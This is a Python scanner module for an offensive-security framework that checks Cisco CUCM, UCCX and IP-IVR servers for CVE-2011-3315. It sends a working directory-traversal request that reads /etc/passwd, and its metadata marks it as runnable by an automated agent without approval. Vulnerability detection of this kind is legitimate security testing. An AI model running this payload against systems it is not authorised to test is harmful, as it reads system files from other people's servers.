#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A directory traversal vulnerability in Cisco Unified Communications Manager (CUCM) 5."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Cisco CUCM, UCCX, and Unified IP-IVR- Directory Traversal Detection',
        'description': 'A directory traversal vulnerability in Cisco Unified Communications Manager (CUCM) 5.x and 6.x before 6.1(5)SU2, 7.x before 7.1(5b)SU2, and 8.x before 8.0(3), and Cisco Unified Contact Center Express (aka Unified CCX or UCCX) and Cisco Unified IP Interactive Voice Response (Unified IP-IVR) before 6.0(1)SR1ES8, 7.0(x) before 7.0(2)ES1, 8.0(x) through 8.0(2)SU3, and 8.5(x) before 8.5(1)SU2, allows remote attackers to read arbitrary files via a crafted URL, aka Bug IDs CSCth09343 and CSCts44049.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2011', 'lfi', 'cisco', 'edb', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/36256',
            'http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20111026-uccx',
            'http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20111026-cucm',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2011-3315',
    }

    def run(self):
        r = self.http_request(method="GET", path='/ccmivr/IVRGetAudioFile.do?file=../../../../../../../../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Cisco CUCM, UCCX, and Unified IP-IVR- Directory Traversal detected",
                path='/ccmivr/IVRGetAudioFile.do?file=../../../../../../../../../../../../../../../etc/passwd',
            )
            return True
        return False

